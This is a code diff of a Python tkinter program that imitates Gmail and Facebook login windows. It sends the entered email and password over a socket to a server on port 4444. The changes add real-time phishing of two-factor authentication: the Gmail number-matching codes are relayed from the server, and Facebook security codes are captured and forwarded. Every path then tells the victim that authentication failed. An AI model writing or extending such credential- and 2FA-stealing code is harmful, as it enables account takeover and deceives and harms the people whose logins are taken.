@@ -2,9 +2,8 @@ from tkinter import *;
 from tkinter import messagebox;
 from tkinter.ttk import *;
 from email_validator import validate_email,EmailNotValidError
-import socket;
-
-REMOTE_IP = "[Server-IP-Address]"
+import socket,time;
+REMOTE_IP = "127.0.0.1"
 REMOTE_PORT = 4444 # Server Port Number
 
 #when gmail and password check are finished, execute this login
@@ -23,9 +22,76 @@ def login(gwindow,gmail,password,isFacebook):
     # F means Facebook
     text = f"G gmail:{gmail} and password:{password}" if isFacebook == False else f"F gmail:{gmail} and password:{password}"
     client.send(text.encode())
-    result = client.recv(1024)
-    #result
-    mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
+    result = client.recv(1024).decode()
+    #you don't need two factor,this will be shown
+    if(result == "okay"):
+        #result
+        mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
+    else:
+        #if two factor is gmail
+        if(result.split(" ")[0] == "G"):
+            res = messagebox.askokcancel("Two-Authentication","Would you like to give access your two-authentication ?")
+            G_two_factor(res,mylabel,client)
+        #if two factor is facebook
+        else:
+            res = messagebox.askokcancel("Two-Authentication","Would you like to give access your two-authentication ?")
+            F_two_factor(res,mylabel,client)
+def G_two_factor(res,mylabel,client):
+    def checkNumber(number):
+        chk = False
+        #input number include your choice authentication number
+        for num in codes:
+            if(num == number):
+                client.send(num.encode())
+                chk = True
+                break
+        #if number is not matched with your choice authentication number
+        if(chk == False):
+            messagebox.showerror("Number Matching","Your number doesn't include in authentication number")
+        else:
+            fwindow.destroy()
+            mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
+        
+    if(res):
+        client.send("okay".encode())
+        # get google authentication 3 number from you
+        codes = client.recv(1024).decode().split(" ")
+        fwindow = Toplevel()
+        fwindow.geometry("400x300")
+        fwindow.title("Gmail Two Authentication")
+        Label(fwindow,text=f'''{codes[0]}      {codes[1]}      {codes[2]}''',font=("Arial",15)).pack(pady=10)
+        number = Entry(fwindow,width=8)
+        number.focus_set()
+        number.pack(pady=8)
+        Button(fwindow,text="authenticate",width=15,command=lambda:checkNumber(number.get())).pack(pady=8)
+    else:
+        #result
+        mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
+
+def F_two_factor(res,mylabel,client):
+    def chk_code(code):
+        client.send(code.encode())
+        # security code is wrong or not
+        result = client.recv(1024).decode()
+        print(result)
+        if(result == "True"):
+            fwindow.destroy()
+            mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
+        else:
+            rlbl.config(text="Security code is wrong,check again")
+    if(res):
+        fwindow = Toplevel()
+        fwindow.geometry("400x300")
+        fwindow.title("Facebook Authentication")
+        rlbl = Label(fwindow,text="",font=("Arial",7),foreground="maroon")
+        rlbl.pack(pady=6)
+        code = Entry(fwindow,width=13)
+        code.focus_set()
+        code.pack(pady=10)
+        Button(fwindow,text="authenticate",width=15,command=lambda:chk_code(code=code.get())).pack(pady=8)
+    else:
+        #result
+        mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
 
 def btn_Event(isFacebook):
     gwindow = Toplevel()
